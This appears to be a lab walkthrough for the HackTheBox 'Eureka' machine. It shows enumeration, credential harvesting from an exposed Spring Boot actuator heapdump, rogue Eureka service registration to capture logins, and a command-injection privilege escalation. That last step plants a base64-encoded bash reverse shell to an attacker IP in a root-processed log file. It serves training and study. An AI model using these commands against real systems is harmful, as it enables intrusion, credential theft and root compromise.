---
layout: post
title: HackTheBox - Eureka
description: HackTheBox Hard Lab Writeup
category: Labs
tags: cloud eureka microservices privilege-escalation
image: assets/htb-eureka-preview.png
date: 2025-08-06 01:58 +0100
---
# Enumeration
## Nmap 

```bash 
nmap $target -sV -sC -vv -Pn -oN eurika-default-scan
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpa5HH8lfpsh11cCkEoqcNXWPj6wh8GaDrnXst/q7zd1PlBzzwnhzez+7mhwfv1PuPf5fZ7KtZLMfVPuUzkUHVEwF0gSN0GrFcKl/D34HmZPZAsSpsWzgrE2sayZa3xZuXKgrm5O4wyY+LHNPuHDUo0aUqZp/f7SBPqdwDdBVtcE8ME/AyTeJiJrOhgQWEYxSiHMzsm3zX40ehWg2vNjFHDRZWCj3kJQi0c6Eh0T+hnuuK8A3Aq2Ik+L2aITjTy0fNqd9ry7i6JMumO6HjnSrvxAicyjmFUJPdw1QNOXm+m+p37fQ+6mClAh15juBhzXWUYU22q2q9O/Dc/SAqlIjn1lLbhpZNengZWpJiwwIxXyDGeJU7VyNCIIYU8J07BtoE4fELI26T8u2BzMEJI5uK3UToWKsriimSYUeKA6xczMV+rBRhdbGe39LI5AKXmVM1NELtqIyt7ktmTOkRQ024ZoSS/c+ulR4Ci7DIiZEyM2uhVfe0Ah7KnhiyxdMSlb0=
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNqI0DxtJG3vy9f8AZM8MAmyCh1aCSACD/EKI7solsSlJ937k5Z4QregepNPXHjE+w6d8OkSInNehxtHYIR5nKk=
|   256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHNmmTon1qbQUXQdI6Ov49enFe6SgC40ECUXhF0agNVn
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
And we add the required entry on `/etc/hosts`

```bash 
echo $target furni.htb eurika.htb | sudo tee -a /etc/hosts
```
## Web Recon

A bit further:


```bash 
$ curl -I http://furni.htb 
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 04 Aug 2025 23:39:32 GMT
Content-Type: text/html;charset=UTF-8
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Language: en-US
```
### Whatweb

```bash                                                                                                                                                  
$ whatweb furni.htb 
http://furni.htb [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.66], Meta-Author[Untree.co], Script, Title[Furni | Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]
```

### Wappalyzer

![Here](assets/htb-eurika-2.png)

Okay we have basic idea about the technology behind the web app.

## Fuzzing

Both fuzzing for subdomains/vhosts and directories lead to nothing **at first**. Because I used the wrong wordlists.

I ran these two commands:

```bash 
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://furni.htb/FUZZ
```
And 

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://furni.htb/ -H "Host: FUZZ.furni.htb"
```

Which lead to nothing. I had no idea about what was the technology stack behind the machine, what is being created/sent/trasnferred or whatsoever.


In here, I was trying things with the session header in the `/login` and `/register` portals. Nothing went as I expected. 


Until I stumbled upon an inexistent page. which showed this error page:

![Here](assets/htb-eurika-1.png)

A simple Google search and turns out that this is the default **SpringBoot** Error page.

So our goal now is to come back to fuzzing and recon to find some technology-specific endpoints, vhosts..etc which was fruitful. 

```bash
$ find /usr/share/seclists -name *springboot* 2>/dev/null

$ find /usr/share/seclists/ -name *Spring* 2>/dev/null 
/usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt
```

And we find `/actuator` directory. 

Although calling it "directory" is wrong, because Spring Boot Actuators are endpoints that provide monitoring and 
information about resources of endpoints using `HTTP` urls not really a physical dierctory.

Within the `Actuator` endpoint, we can access even more endpoints like `/health`, `/info`...etc

# Foothold

A bit more fuzzing and we find the stuff:

```bash 
ffuf -w /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt:FUZZ -u http://furni.htb/FUZZ
```

![Here](assets/htb-eurika-9.png)

Which can also be found using `dirsearch`

```bash 
dirsearch -u http://furni.htb/ -t 50
```

The thing that sounded the weirdest to be exposed was the `/heapdump`. Will come back to this in a moment.

I prefered poking around some endpoints like 
- `/env`: which exposed this directory : `/var/www/web/Furni/src/main/resources/application.properties` which we will 
need after in the foothold machine. 

And a mention about `Eureka` instance.

But a lot is censored like `management.endpoints.web.exposure.include` which tells what endpoints are included within `/actuator`

![Here](assets/htb-eurika-10.png)

![Here](assets/htb-eurika-11.png)


So, the others revealed nothing really import, jumping right into `/actuator/heapdump`.


```bash 
wget http://furni.htb/actuator/heapdump -O heapdump
```
I searched for tools to analyze the file, they exist, but I found it difficuelt to use them: weird syntax, I didn't where to look at. 

So? Good old `strings`.

```bash
strings heapdump | less -S
```

And then within the opened pager, I searched with `/password` and looped through the existing hits using `n`. Until I found these creds: 
`{password=<PASSWORD>, user=<USER>}!`


Simply, SSH into the machine using:

```bash 
ssh oscar190@furni.htb
```

# Lateral Movement

- `sudo -l` made the server laugh at me.
- `find / -perm -4000 2>/dev/null` didn't lead to nothing either.
- `netstat -tulpn` showed some services running on `8080`, `8081`, `8082`.  I overlookedone that was running on `8761`. Which was the real target.

I tried Local Port Forwarding of 8080, 8081 and 8082 using the following command:

```bash 
sudo -L 8080:localhost:8080 -L 8081:localhost:8081 -L 8082:localhost:8082 oscar190@furni.htb
```

Which was completely wrong because those were microservices running for the service running on 8761. Which at this point, still haven't figured it out.

So I ran the `linpeas` and got things about a service called `Eureka` at the directory mentionned in the `/actuator/env` endpoint.

Only now i port forwarded the service at 8761 to face this:

![Here](assets/htb-eurika-12.png)

So we need creds. Let's enumerate some more. 

**Targets:**

```bash
ls /var/www/web/
cloud-gateway  Eureka-Server  Furni  static  user-management-service
```

Simply ran this following command and found some creds: 

```bash 
grep -ri password /var/www/web/*
```

![Here](assets/htb-eurika-6.png)

We need a username for the second password. So navigating to that yaml file and we get the creds:

```yaml 
spring:
  application:
    name: "Eureka Server"

  security:
    user:
      name: <USER>
      password:<PASS> 

server:
  port: 8761
  address: 0.0.0.0

eureka:
  client:
    register-with-eureka: false
    fetch-registry: false
```

![Her](assets/htb-eurika-7.png)

And we connect to the forwarded service, to find a Goldmine: 

![Here](assets/htb-eurika-13.png)

Those were the services I was trying to forward alone without the `Eureka` service. 

A bit of research showed that this exposure of the registry server is a critical vulnerability that could lead us to RCE. 

Our goal now is to create a malicious micro-service-look-alike, we might hijack internal services connections, exploit some SSRF and exploit the
target's traffic.

In here, I foudn the correct idea, but port-forwarding the microservices ports was the issue. 
We need to use that port as a listener and act as the legit one. 

So i broke the portwrwarding connection and did this:

First we start a listener at `8081`:

```bash 
nc -nlvp 8081
```

And then run: 


```bash 
curl -X POST http://user:pass@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE  -H "Content-Type: application/json"   -H "Accept: application/json"   -d '{
    "instance": {
      "hostName": "<YOUR IP>",
      "app": "USER-MANAGEMENT-SERVICE",
      "vipAddress": "USER-MANAGEMENT-SERVICE",
      "secureVipAddress": "USER-MANAGEMENT-SERVICE",
      "ipAddr": "<YOUR IP>",
      "status": "UP",
      "port": { "$": 8081, "@enabled": true },
      "dataCenterInfo": {
        "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
        "name": "MyOwn"
      }
    }
  }'
```

After some time, we will get a hit back containing valid miranda-wise creds. And logging in as miranda-wise will get us the user flag.

![here](assets/htb-eurika-15.png)

```bash 
ssh miranda-wise@10.10.11.66
```

>User flag owned.
{: .prompt-tip }


# Privilege Escalation

## Recon 

Now aiming at the root user, the usual recon: 

```bash 
id && uname -a
```

```bash 
sudo -l
```

Can't run it.

```bash 
find / -perm -4000 2>/dev/null 
```
Nothing, except a rabbit hole I created for myself by searching for `dmcrypt-get-device` binary. I don't know why either.

```bash 
netstat -tulpn
```

Nothing new, the same microservices from before. 

```bash 
ps aux | grep root

<REDACTED>

root      962398  0.0  0.0   2608   592 ?        Ss   20:00   0:00 /bin/sh -c /opt/scripts/miranda-Login-Simulator.sh
root      962402  0.0  0.0   6892  3420 ?        S    20:00   0:00 /bin/bash /opt/scripts/miranda-Login-Simulator.sh

<REDACTED>

```

Okay, a script running with sudo privileges, but we don't have permissions over the whole `/opt/scripts` directory.

BUT. 

An interesting script at the `/opt` directory: 

```bash
#!/bin/bash

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

LOG_FILE="$1"
OUTPUT_FILE="log_analysis.txt"

declare -A successful_users  # Associative array: username -> count
declare -A failed_users      # Associative array: username -> count
STATUS_CODES=("200:0" "201:0" "302:0" "400:0" "401:0" "403:0" "404:0" "500:0") # Indexed array: "code:count" pairs

if [ ! -f "$LOG_FILE" ]; then
    echo -e "${RED}Error: Log file $LOG_FILE not found.${RESET}"
    exit 1
fi


analyze_logins() {
    # Process successful logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${successful_users[$username]+_}" ]; then
            successful_users[$username]=$((successful_users[$username] + 1))
        else
            successful_users[$username]=1
        fi
    done < <(grep "LoginSuccessLogger" "$LOG_FILE")

    # Process failed logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${failed_users[$username]+_}" ]; then
            failed_users[$username]=$((failed_users[$username] + 1))
        else
            failed_users[$username]=1
        fi
    done < <(grep "LoginFailureLogger" "$LOG_FILE")
}


analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}


analyze_log_errors(){
     # Log Level Counts (colored)
    echo -e "\n${YELLOW}[+] Log Level Counts:${RESET}"
    log_levels=$(grep -oP '(?<=Z  )\w+' "$LOG_FILE" | sort | uniq -c)
    echo "$log_levels" | awk -v blue="$BLUE" -v yellow="$YELLOW" -v red="$RED" -v reset="$RESET" '{
        if ($2 == "INFO") color=blue;
        else if ($2 == "WARN") color=yellow;
        else if ($2 == "ERROR") color=red;
        else color=reset;
        printf "%s%6s %s%s\n", color, $1, $2, reset
    }'

    # ERROR Messages
    error_messages=$(grep ' ERROR ' "$LOG_FILE" | awk -F' ERROR ' '{print $2}')
    echo -e "\n${RED}[+] ERROR Messages:${RESET}"
    echo "$error_messages" | awk -v red="$RED" -v reset="$RESET" '{print red $0 reset}'

    # Eureka Errors
    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' "$LOG_FILE")
    eureka_count=$(echo "$eureka_errors" | wc -l)
    echo -e "\n${YELLOW}[+] Eureka Connection Failures:${RESET}"
    echo -e "${YELLOW}Count: $eureka_count${RESET}"
    echo "$eureka_errors" | tail -n 2 | awk -v yellow="$YELLOW" -v reset="$RESET" '{print yellow $0 reset}'
}


display_results() {
    echo -e "${BLUE}----- Log Analysis Report -----${RESET}"

    # Successful logins
    echo -e "\n${GREEN}[+] Successful Login Counts:${RESET}"
    total_success=0
    for user in "${!successful_users[@]}"; do
        count=${successful_users[$user]}
        printf "${GREEN}%6s %s${RESET}\n" "$count" "$user"
        total_success=$((total_success + count))
    done
    echo -e "${GREEN}\nTotal Successful Logins: $total_success${RESET}"

    # Failed logins
    echo -e "\n${RED}[+] Failed Login Attempts:${RESET}"
    total_failed=0
    for user in "${!failed_users[@]}"; do
        count=${failed_users[$user]}
        printf "${RED}%6s %s${RESET}\n" "$count" "$user"
        total_failed=$((total_failed + count))
    done
    echo -e "${RED}\nTotal Failed Login Attempts: $total_failed${RESET}"

    # HTTP status codes
    echo -e "\n${CYAN}[+] HTTP Status Code Distribution:${RESET}"
    total_requests=0
    # Sort codes numerically
    IFS=$'\n' sorted=($(sort -n -t':' -k1 <<<"${STATUS_CODES[*]}"))
    unset IFS
    for entry in "${sorted[@]}"; do
        code=$(echo "$entry" | cut -d':' -f1)
        count=$(echo "$entry" | cut -d':' -f2)
        total_requests=$((total_requests + count))
        
        # Color coding
        if [[ $code =~ ^2 ]]; then color="$GREEN"
        elif [[ $code =~ ^3 ]]; then color="$YELLOW"
        elif [[ $code =~ ^4 || $code =~ ^5 ]]; then color="$RED"
        else color="$CYAN"
        fi
        
        printf "${color}%6s %s${RESET}\n" "$count" "$code"
    done
    echo -e "${CYAN}\nTotal HTTP Requests Tracked: $total_requests${RESET}"
}


# Main execution
analyze_logins
analyze_http_statuses
display_results | tee "$OUTPUT_FILE"
analyze_log_errors | tee -a "$OUTPUT_FILE"
echo -e "\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}"
```
{: file="/opt/log_analyse.sh"}

The file might lead to something since it is owned by root, and accepts a user input. With some tempering, we might get something back. 

Only if we get this file to be executed, which is indeed being regularly.

Which is confirmed by `pspsy` tool.

```bash 
attack-host$ scp pspy64 miranda-wise@10.10.11.66

miranda-wise$ pspy64

<REDACTED>

2025/08/05 20:18:03 CMD: UID=0     PID=986618 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log 
2025/08/05 20:18:03 CMD: UID=0     PID=986621 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log 
2025/08/05 20:18:03 CMD: UID=0     PID=986623 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log 
2025/08/05 20:18:03 CMD: UID=0     PID=986622 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log

<REDACTED>
```
And confirmed with `linpeas`:

```bash 
attack-host$ scp linpeas.sh miranda-wise@10.10.11.66

miranda@target$ bash linpeas.sh
```


![here](/assets/htb-eurika-17.png)


![here](/assets/htb-eurika-18.png)


![here](/assets/htb-eurika-19.png)


## PE Vector

So, what do we have now: 

- A script owned by root and gets executed by root periodically.
- The script takes the `/var/www/web/cloud-gateway/log/application.log` for which we have `rw-` permissions on.

So if the script is vulnerable, we can overwrite that file with a malicious code to break the legit execution and perform whatever we can. 

## Code Analysis 

Here is the vulnerable function: 

```bash 
analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}
```

The function takes the value after `Status:` and expects it to be a number. When comparing it here:

```bash 
if [[ "$existing_code" -eq "$code" ]]; then
```

If we put for example this line: `Status: 200; whoami` the comparaison fails and our code gets executed. 

But, the result is being saved to `log_analysis.txt` for which we have no privileges and that payload won't even work.

I thought of using `$()` and get a rev shell when evaluating the command, but that didn't work because It errors out when being compared later because 
it needs to be a string. So the solution is wrapping it wiht `x[]` and get the final payload: 

Setup a listener and encode this payload `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1`.


```bash 
cd /var/www/web/cloud-gateway/log
rm -f application.log
echo 'HTTP Status: x[$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTkvOTQ0MyAwPiYxCg== | base64 -d | bash -i)]' >> application.log
./pspy64
```

We wait for the root user to start executing the script: 

![Here](assets/htb-eurika-20.png)

Soon enough: 
![](assets/htb-eurika-21.png)

>Rooted!
{: .prompt-tip } 




